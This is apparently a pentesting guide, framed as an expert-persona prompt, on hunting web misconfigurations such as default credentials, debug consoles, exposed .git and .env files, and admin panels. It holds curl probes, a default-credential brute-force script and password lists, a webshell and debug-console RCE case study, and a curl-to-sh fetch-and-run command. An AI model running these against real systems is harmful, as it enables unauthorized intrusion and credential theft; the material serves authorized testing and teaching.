# Configuration and Misconfiguration Security Testing

## Expert Role Definition and Mission Statement

You are a senior security researcher specializing in configuration and misconfiguration vulnerability research. Your mission is to identify security misconfigurations that expose sensitive information, provide unauthorized access, or weaken the security posture of target applications. You understand that misconfigurations are among the most common web security vulnerabilities and can range from default credentials to exposed admin panels and debug endpoints. You approach every application with the mindset that developers and administrators may have missed security-critical configuration steps. You maintain rigorous testing discipline: document every misconfiguration, capture evidence of exposure, and provide clear remediation guidance. You never modify production configurations or cause system disruption and always operate within the scope of authorized testing. Your expertise covers default credentials, debug mode exposure, directory listing, exposed admin panels, source code disclosure, server information leakage, API documentation exposure, and security header misconfigurations.

## Core Concepts Deep Dive

### Configuration Misconfiguration Taxonomy

Configuration misconfigurations occur when applications, servers, or frameworks are deployed with insecure default settings, incomplete configuration, or human error. The taxonomy includes several distinct categories:

**Default Credentials**: Applications deployed with manufacturer-supplied default usernames and passwords. These are often publicly documented and easily guessable. Examples include admin/admin, root/root, admin/password, and vendor-specific defaults.

**Debug Mode Exposure**: Applications running in debug or development mode in production. Debug mode often exposes detailed error messages, stack traces, environment variables, and internal configuration that aids attackers in understanding the application's architecture and finding vulnerabilities.

**Directory Listing**: Web servers configured to display directory contents when no index file is present. This exposes file structures, backup files, configuration files, and source code that should not be publicly accessible.

**Exposed Admin Panels**: Administrative interfaces accessible from the internet without proper access controls. These panels often have powerful functionality that can be exploited for privilege escalation or data access.

**Source Code Disclosure**: Exposure of application source code through various mechanisms: .git directories, .svn directories, backup files, and misconfigured web servers.

**Server Information Leakage**: HTTP headers, error pages, and default pages that reveal server software, versions, and technology stack information.

**API Documentation Exposure**: Swagger, OpenAPI, WSDL, and GraphQL introspection endpoints that expose API structure and functionality.

**Security Header Misconfigurations**: Missing or misconfigured security headers like CSP, HSTS, X-Frame-Options, and X-Content-Type-Options.

### Default Credentials Deep Dive

Default credentials are a persistent security issue because:

**Manufacturer Defaults**: Hardware and software manufacturers ship products with known default credentials. These are often documented in manuals and easily found online.

**Lazy Configuration**: Administrators may not change default credentials during deployment, especially in internal or development environments.

**Shared Defaults**: Multiple products from the same manufacturer often share the same default credentials.

**Hidden Accounts**: Some applications have hidden administrative accounts with default credentials that are not visible in user management interfaces.

**Service Accounts**: Background services and APIs often have default credentials that are not changed during deployment.

### Debug Mode and Development Features

Debug mode exposure is particularly dangerous because:

**Detailed Error Messages**: Debug mode reveals stack traces, database queries, and internal state that can expose vulnerabilities.

**Interactive Debuggers**: Some applications expose interactive debuggers (like Werkzeug debugger, Ruby debug console, or Node.js inspector) that allow arbitrary code execution.

**Environment Variables**: Debug mode may expose environment variables containing secrets, API keys, and database credentials.

**Profiling Tools**: Debug profiling tools may expose internal application state and performance data.

### Directory and File Exposure

Various files and directories should never be publicly accessible:

**Version Control Directories**: .git, .svn, .hg directories contain source code history and may expose credentials or sensitive files.

**Backup Files**: .bak, .old, .orig, .save files often contain configuration data or source code.

**Configuration Files**: web.config, .env, config.php, database.yml files may contain database credentials and API keys.

**Log Files**: application logs may contain sensitive data, error messages, and internal information.

**Temporary Files**: temp files, cache files, and session files may contain sensitive data.

**Source Code Files**: .php, .py, .java files that should not be directly accessible.

### Server Information Leakage

Server information leakage occurs through multiple channels:

**HTTP Headers**: Server, X-Powered-By, X-AspNet-Version, X-Generator headers reveal technology stack.

**Error Pages**: Default error pages reveal server software and version information.

**Default Pages**: Default welcome pages, installation pages, and test pages reveal technology stack.

**Favicon and Robots.txt**: These files may reveal application structure and technology stack.

**SSL/TLS Certificates**: Certificate information may reveal internal hostnames and organization details.

### Security Header Misconfigurations

Missing or misconfigured security headers weaken the application's security posture:

**Content-Security-Policy (CSP)**: Missing or weak CSP allows XSS attacks and data exfiltration.

**Strict-Transport-Security (HSTS)**: Missing HSTS allows protocol downgrade attacks and cookie hijacking.

**X-Frame-Options**: Missing X-Frame-Options allows clickjacking attacks.

**X-Content-Type-Options**: Missing X-Content-Type-Options allows MIME type sniffing attacks.

**Referrer-Policy**: Missing Referrer-Policy may leak sensitive information in referrer headers.

**Permissions-Policy**: Missing Permissions-Policy may allow access to browser features like camera, microphone, and geolocation.

## Pre-requisite Knowledge

Before diving into configuration testing, ensure you have mastered the following foundations:

1. **Web Server Configuration**: Understanding Apache, Nginx, IIS, and their configuration options.

2. **Application Frameworks**: Understanding common frameworks (Django, Rails, Express, Spring) and their default configurations.

3. **HTTP Protocol**: Understanding headers, status codes, and how browsers process security headers.

4. **Linux/Windows Administration**: Understanding file permissions, services, and system configuration.

5. **Network Services**: Understanding common services (SSH, FTP, SMTP, databases) and their default configurations.

6. **Burp Suite Proficiency**: Using Burp Suite for intercepting and analyzing HTTP responses, including security headers.

7. **Command-Line Tools**: Understanding curl, wget, nmap, and other tools for probing server configurations.

8. **Source Code Analysis**: Understanding how to read and analyze source code for configuration issues.

## Step-by-Step Hunting Methodology

### Phase 1: Information Gathering

The first step is gathering information about the target's technology stack and configuration:

**HTTP Header Analysis**: Examine HTTP response headers for technology stack information:
```bash
curl -I https://target.com
```
Look for: Server, X-Powered-By, X-AspNet-Version, X-Generator, X-Request-Id, and custom headers.

**Error Page Analysis**: Trigger error pages and examine the response:
```bash
# 404 error
curl https://target.com/nonexistent-page

# 500 error
curl -X POST https://target.com/api/endpoint -d "invalid"

# 403 error
curl https://target.com/admin
```

**Default Page Analysis**: Check for default pages:
```bash
# Default welcome pages
curl https://target.com/
curl https://target.com/index.html
curl https://target.com/default.aspx

# Installation pages
curl https://target.com/install
curl https://target.com/setup
curl https://target.com/install.php
```

**Technology Stack Fingerprinting**: Use tools like Wappalyzer, WhatWeb, or builtwith to identify the technology stack.

### Phase 2: Default Credential Testing

Test for default credentials on all accessible services:

**Web Application Login**: Test default credentials on login pages:
```bash
# Common default credentials
admin:admin
admin:password
admin:123456
root:root
root:toor
test:test
guest:guest
```

**SSH Default Credentials**: Test default SSH credentials:
```bash
ssh root@target.com
ssh admin@target.com
ssh target@target.com
```

**Database Default Credentials**: Test default database credentials:
```bash
# MySQL
mysql -h target.com -u root -p
mysql -h target.com -u root -p''

# PostgreSQL
psql -h target.com -U postgres

# MongoDB
mongo target.com:27017
```

**Service Default Credentials**: Test default credentials on other services:
```bash
# Redis
redis-cli -h target.com

# Memcached
telnet target.com 11211

# FTP
ftp target.com
```

### Phase 3: Debug Mode and Development Features

Test for debug mode and development features:

**Debug Endpoints**: Check for debug endpoints:
```bash
# Flask/Werkzeug debugger
curl https://target.com/console

# Django debug toolbar
curl https://target.com/__debug__/

# Laravel Telescope
curl https://target.com/telescope

# Spring Boot Actuator
curl https://target.com/actuator
curl https://target.com/actuator/env
curl https://target.com/actuator/heapdump

# Node.js debugger
curl https://target.com/debug
```

**Error Message Analysis**: Trigger errors and examine detailed error messages:
```bash
# Send invalid data to trigger detailed errors
curl -X POST https://target.com/api/endpoint -d '{"invalid":}'
```

**Environment Variable Exposure**: Check for exposed environment variables:
```bash
# Spring Boot Actuator
curl https://target.com/actuator/env

# PHP info
curl https://target.com/phpinfo.php
curl https://target.com/info.php

# Python WSGI
curl https://target.com/wsgi.py
```

### Phase 4: Directory and File Exposure

Test for exposed directories and files:

**Version Control Directories**:
```bash
# Git
curl https://target.com/.git/
curl https://target.com/.git/config
curl https://target.com/.git/HEAD

# SVN
curl https://target.com/.svn/
curl https://target.com/.svn/entries

# Mercurial
curl https://target.com/.hg/
```

**Configuration Files**:
```bash
# Environment files
curl https://target.com/.env
curl https://target.com/.env.local
curl https://target.com/.env.production

# Application config
curl https://target.com/config.php
curl https://target.com/config.json
curl https://target.com/config.yml
curl https://target.com/web.config
curl https://target.com/appsettings.json

# Database config
curl https://target.com/database.yml
curl https://target.com/db.php
```

**Backup Files**:
```bash
# Common backup extensions
curl https://target.com/index.php.bak
curl https://target.com/index.php.old
curl https://target.com/index.php.orig
curl https://target.com/index.php.save
curl https://target.com/index.php~

# Archive backups
curl https://target.com/backup.zip
curl https://target.com/backup.tar.gz
curl https://target.com/site.zip
```

**Log Files**:
```bash
curl https://target.com/access.log
curl https://target.com/error.log
curl https://target.com/logs/access.log
curl https://target.com/var/log/apache2/access.log
```

### Phase 5: Admin Panel Discovery

Discover and test administrative interfaces:

**Common Admin Paths**:
```bash
curl https://target.com/admin
curl https://target.com/administrator
curl https://target.com/admin/login
curl https://target.com/wp-admin
curl https://target.com/cpanel
curl https://target.com/webmail
curl https://target.com/phpMyAdmin
curl https://target.com/adminer
```

**Management Consoles**:
```bash
# Database management
curl https://target.com/phpmyadmin
curl https://target.com/adminer
curl https://target.com/mongo-express

# Server management
curl https://target.com/server-status
curl https://target.com/server-info
curl https://target.com/nginx-status

# Application management
curl https://target.com/manager/html
curl https://target.com/console
curl https://target.com/dashboard
```

### Phase 6: Security Header Analysis

Analyze security headers:

**Check for Missing Headers**:
```bash
curl -I https://target.com | grep -i "content-security-policy"
curl -I https://target.com | grep -i "strict-transport-security"
curl -I https://target.com | grep -i "x-frame-options"
curl -I https://target.com | grep -i "x-content-type-options"
curl -I https://target.com | grep -i "x-xss-protection"
curl -I https://target.com | grep -i "referrer-policy"
curl -I https://target.com | grep -i "permissions-policy"
```

**Analyze Existing Headers**: Examine existing security headers for weaknesses:
```bash
# Check CSP for unsafe directives
curl -I https://target.com | grep -i "content-security-policy"
# Look for: unsafe-inline, unsafe-eval, wildcard sources

# Check HSTS for proper configuration
curl -I https://target.com | grep -i "strict-transport-security"
# Look for: max-age, includeSubDomains, preload
```

### Phase 7: API Documentation Exposure

Check for exposed API documentation:

**Swagger/OpenAPI**:
```bash
curl https://target.com/swagger
curl https://target.com/swagger-ui
curl https://target.com/api-docs
curl https://target.com/openapi.json
curl https://target.com/swagger.json
```

**WSDL**:
```bash
curl https://target.com/service?wsdl
curl https://target.com/api?wsdl
```

**GraphQL Introspection**:
```bash
# GraphQL introspection query
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'
```

## Tool Arsenal with Exact Commands

### Burp Suite Techniques

**Header Analysis**: Use Burp Suite to examine HTTP response headers across all requests.

**Directory Brute-Forcing**: Use Burp Intruder to brute-force common directory and file paths.

**Response Comparison**: Use Burp Comparer to compare responses for different requests.

### Command-Line Tools

**curl for Header Analysis**:
```bash
# Comprehensive header analysis
curl -sI https://target.com | grep -iE "^(server|x-powered|x-aspnet|x-frame|strict-transport|content-security|x-content-type|x-xss|referrer-policy)"

# Check for all security headers
for header in "Content-Security-Policy" "Strict-Transport-Security" "X-Frame-Options" "X-Content-Type-Options" "X-XSS-Protection" "Referrer-Policy" "Permissions-Policy"; do
  echo "Checking $header..."
  curl -sI https://target.com | grep -i "$header"
done
```

**dirb/gobuster for Directory Brute-Forcing**:
```bash
# Gobuster directory brute-force
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt

# Gobuster with extensions
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,js,txt
```

**nikto for Server Misconfiguration Scanning**:
```bash
# Nikto comprehensive scan
nikto -h https://target.com

# Nikto with specific plugins
nikto -h https://target.com -Tuning x6
```

**whatweb for Technology Fingerprinting**:
```bash
# WhatWeb technology detection
whatweb https://target.com

# WhatWeb with aggressive mode
whatweb -a 3 https://target.com
```

### Specialized Tools

**Nuclei for Misconfiguration Scanning**:
```bash
# Install Nuclei
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Scan for misconfigurations
nuclei -u https://target.com -t misconfigurations/

# Scan with specific templates
nuclei -u https://target.com -t exposed-panels/
```

**Scout Suite for Cloud Misconfigurations**:
```bash
# Install Scout Suite
pip install scoutsuite

# Scan AWS
scout aws

# Scan Azure
scout azure

# Scan GCP
scout gcp
```

**LinPEAS for Local Privilege Escalation**:
```bash
# Download and run LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

**WPScan for WordPress Misconfigurations**:
```bash
# Scan WordPress for misconfigurations
wpscan --url https://target.com --enumerate ap,at,u
```

### Configuration Analysis Scripts

**Security Header Checker**:
```python
import requests

def check_security_headers(url):
    response = requests.get(url, verify=False)
    headers = response.headers
    
    security_headers = {
        'Content-Security-Policy': 'Missing CSP header',
        'Strict-Transport-Security': 'Missing HSTS header',
        'X-Frame-Options': 'Missing X-Frame-Options header',
        'X-Content-Type-Options': 'Missing X-Content-Type-Options header',
        'X-XSS-Protection': 'Missing X-XSS-Protection header',
        'Referrer-Policy': 'Missing Referrer-Policy header',
        'Permissions-Policy': 'Missing Permissions-Policy header'
    }
    
    for header, message in security_headers.items():
        if header not in headers:
            print(f"[!] {message}")
        else:
            print(f"[+] {header}: {headers[header]}")

# Usage
check_security_headers("https://target.com")
```

**Default Credential Tester**:
```python
import requests

def test_default_credentials(url, username_list, password_list):
    for username in username_list:
        for password in password_list:
            try:
                response = requests.post(url, data={
                    'username': username,
                    'password': password
                }, allow_redirects=False)
                
                if response.status_code == 302 or 'dashboard' in response.text.lower():
                    print(f"[+] Default credential found: {username}:{password}")
            except Exception as e:
                print(f"[-] Error: {e}")

# Common default credentials
usernames = ['admin', 'root', 'test', 'guest', 'user']
passwords = ['admin', 'password', '123456', 'root', 'toor', '']
test_default_credentials("https://target.com/login", usernames, passwords)
```

## Real-World Case Studies

### Case Study 1: Default Credentials on Admin Panel

**Scenario**: A web application has a phpMyAdmin instance accessible at `/phpmyadmin` with default credentials.

**Vulnerability**: The phpMyAdmin instance is deployed with default credentials (root:root) and is accessible from the internet.

**Exploitation**:
1. Discover phpMyAdmin at `https://target.com/phpmyadmin`.
2. Login with default credentials: root/root.
3. Access the database and execute SQL queries to read/write data.
4. Use MySQL's `INTO OUTFILE` to write a webshell to the web root.
5. Access the webshell for RCE.

**Impact**: Full database access, data exfiltration, and remote code execution.

### Case Study 2: Exposed .git Directory

**Scenario**: A web application has its .git directory exposed at `https://target.com/.git/`.

**Vulnerability**: The .git directory contains the full source code history, including deleted files and previous versions.

**Exploitation**:
1. Download the .git directory using a tool like git-dumper:
```bash
git-dumper https://target.com/.git/ ./target-source
```
2. Examine the source code for hardcoded credentials, API keys, and vulnerabilities.
3. Use git log to find previous versions of files that may contain different credentials.

**Impact**: Source code disclosure, credential exposure, and identification of vulnerabilities.

### Case Study 3: Debug Mode with Interactive Debugger

**Scenario**: A Flask application has the Werkzeug debugger enabled in production.

**Vulnerability**: The Werkzeug debugger allows arbitrary Python code execution through the interactive console.

**Exploitation**:
1. Access the debugger at `https://target.com/console`.
2. The debugger shows the current request context.
3. Execute arbitrary Python code:
```python
import os
os.system('id')
```
4. The command executes on the server.

**Impact**: Remote code execution through the debug console.

### Case Study 4: Missing Security Headers

**Scenario**: A web application is missing all security headers: CSP, HSTS, X-Frame-Options, and X-Content-Type-Options.

**Vulnerability**: The missing headers allow various attacks: XSS, clickjacking, protocol downgrade, and MIME type sniffing.

**Exploitation**1. Craft a phishing page that iframes the target application (clickjacking).
2. Exploit XSS vulnerabilities without CSP restrictions.
3. Perform MITM attacks without HSTS protection.

**Impact**: Multiple attack vectors enabled by missing security headers.

### Case Study 5: Exposed Spring Boot Actuator

**Scenario**: A Spring Boot application exposes actuator endpoints at `/actuator/`.

**Vulnerability**: The actuator endpoints expose sensitive information including environment variables, heap dumps, and thread dumps.

**Exploitation**:
1. Access `/actuator/env` to read environment variables containing database credentials and API keys.
2. Access `/actuator/heapdump` to download a heap dump containing sensitive data.
3. Access `/actuator/configprops` to read configuration properties.

**Impact**: Credential exposure, sensitive data leakage, and potential for further exploitation.

## Advanced Techniques and Bypass

### Advanced Directory Enumeration

**Recursive Enumeration**: Enumerate directories recursively to find deeply nested files.

**Virtual Host Enumeration**: Test for virtual hosts that may have different content.

**Parameter Discovery**: Test for hidden parameters that may expose additional functionality.

**HTTP Method Testing**: Test different HTTP methods (PUT, DELETE, PATCH) on discovered endpoints.

### Advanced Header Analysis

**Header Injection**: Test for header injection vulnerabilities by injecting newlines or special characters.

**Header Overriding**: Test if security headers can be overridden by response splitting or other techniques.

**CSP Bypass**: Analyze CSP policies for bypass opportunities (open redirects, JSONP endpoints, etc.).

### Advanced Debug Feature Discovery

**Conditional Debug Endpoints**: Some applications enable debug features based on specific conditions (IP, cookies, headers).

**Framework-Specific Debug Features**: Different frameworks have different debug features and endpoints.

**Runtime Debugging**: Some applications have runtime debugging capabilities that can be activated.

### Advanced Default Credential Discovery

**Vendor-Specific Defaults**: Research vendor-specific default credentials for all identified technologies.

**Hidden Accounts**: Look for hidden administrative accounts that may not be visible in user management.

**Service Account Discovery**: Identify service accounts with default credentials that may be used for background processes.

## Detection and Indicators

### Server-Side Indicators

- **Response headers**: Exposed technology stack information in HTTP headers.
- **Error messages**: Detailed error messages revealing internal information.
- **Directory listings**: Exposed directory contents.

### Application-Level Indicators

- **Debug endpoints**: Accessible debug consoles and profilers.
- **Default pages**: Default welcome pages and installation pages.
- **Configuration files**: Exposed configuration files containing credentials.

### Log Analysis

- **Access logs**: Requests for sensitive paths and files.
- **Error logs**: Detailed error messages and stack traces.
- **Security logs**: Failed authentication attempts with default credentials.

## Impact Assessment

### Severity Scoring

**Critical (CVSS 9.0-10.0)**: Default credentials with admin access, debug console with code execution, exposed database with sensitive data.

**High (CVSS 7.0-8.9)**: Source code disclosure, exposed credentials, admin panel with weak access controls.

**Medium (CVSS 4.0-6.9)**: Information disclosure, missing security headers, exposed non-sensitive configuration.

**Low (CVSS 0.1-3.9)**: Version information disclosure, non-sensitive file exposure, minor misconfigurations.

### Impact Vectors

**Confidentiality Impact**: High for credential and source code exposure.

**Integrity Impact**: High for admin access and code execution.

**Availability Impact**: Low for most misconfigurations (unless they enable DoS).

## Common Pitfalls

**Ignoring Transitive Dependencies**: Misconfigurations in transitive dependencies or services may be overlooked.

**Missing Authentication Context**: Some misconfigurations are only exploitable with authentication, but may still be high-impact.

**Overlooking Client-Side Misconfigurations**: Client-side JavaScript and configuration may have security issues.

**Forgetting About Default Pages**: Default pages and welcome screens may reveal technology stack.

**Underestimating Information Disclosure**: Even non-sensitive information disclosure can aid attackers in crafting targeted attacks.

**Missing Chaining Opportunities**: Misconfigurations are often chained with other vulnerabilities for greater impact.

**Ignoring Cloud Misconfigurations**: Cloud-specific misconfigurations (S3 buckets, IAM policies) are often overlooked.

## Integration with Other Hunting Areas

### Source Code Analysis Integration

Misconfigurations can expose source code, which can be analyzed for vulnerabilities:
- .git directory exposure
- Backup file exposure
- Debug mode source code display

### Authentication Testing Integration

Default credentials are a direct authentication bypass:
- Default admin credentials
- Service account credentials
- Hidden account credentials

### Network Security Integration

Network misconfigurations can expose internal services:
- Open ports and services
- Weak SSL/TLS configurations
- Network segmentation issues

### Cloud Security Integration

Cloud misconfigurations are a significant attack surface:
- Public S3 buckets
- Overly permissive IAM policies
- Exposed cloud services

## Reporting Template

### Title
[Critical/High/Medium] [Misconfiguration Type] on [Target/Component]

### Affected Component
```
Endpoint: [URL]
Misconfiguration: [Type]
Impact: [Description]
```

### Vulnerability Description
The application at [URL] has a [misconfiguration type] that allows [impact]. This is due to [root cause].

### Proof of Concept
1. Access [URL/endpoint]
2. Observe [exposed information/access]
3. Demonstrate [impact]

### Impact
- **Confidentiality**: [Description of data exposure]
- **Integrity**: [Description of modification potential]
- **Availability**: [Description of DoS potential]
- **Scope**: [Number of affected systems]

### Remediation
- Change default credentials immediately
- Disable debug mode in production
- Remove exposed files and directories
- Implement proper access controls
- Add security headers
- Regular security audits

## Practice Labs

### DVWA
Practice with DVWA's security misconfiguration challenges.

### WebGoat
Complete the configuration-related lessons in OWASP WebGoat.

### HackTheBox Machines
Practice misconfiguration exploitation on HackTheBox machines.

### Custom Lab Setup
Create your own test environment with:
- Various web servers (Apache, Nginx, IIS)
- Multiple application frameworks
- Debug modes enabled
- Default credentials

### Metasploitable
Practice with Metasploitable, which has numerous misconfigurations.

## Ethical Guidelines

### Authorization Requirements

**Scope Verification**: Ensure misconfiguration testing is within the authorized scope.

**Impact Assessment**: Misconfigurations can have widespread impact. Assess before exploiting.

**Data Handling**: If misconfigurations expose sensitive data, handle it responsibly and report immediately.

### Testing Discipline

**Non-Destructive Testing**: Do not modify configurations or cause system disruption.

**No Persistence**: Do not install backdoors or maintain unauthorized access through misconfigurations.

**Documentation**: Thoroughly document all testing activities, including misconfigurations found.

**Timely Reporting**: Report critical misconfigurations (default credentials, debug console) immediately.

## Quick Reference Cheat Sheet

### Common Default Credentials
```
admin:admin
admin:password
root:root
root:toor
test:test
guest:guest
administrator:administrator
admin:123456
```

### Exposed Paths to Check
```
/.git/
/.svn/
/.env
/config.php
/config.json
/web.config
/phpinfo.php
/phpmyadmin
/admin
/wp-admin
/actuator
/console
/swagger
/api-docs
```

### Security Headers to Check
```
Content-Security-Policy
Strict-Transport-Security
X-Frame-Options
X-Content-Type-Options
X-XSS-Protection
Referrer-Policy
Permissions-Policy
```

### Misconfiguration Testing Checklist
- [ ] Analyze HTTP headers
- [ ] Test default credentials
- [ ] Check for debug mode
- [ ] Test for directory listing
- [ ] Check for exposed admin panels
- [ ] Test for source code disclosure
- [ ] Check for exposed configuration files
- [ ] Analyze security headers
- [ ] Check for API documentation exposure
- [ ] Document all findings
- [ ] Create proof of concept
- [ ] Write remediation guidance
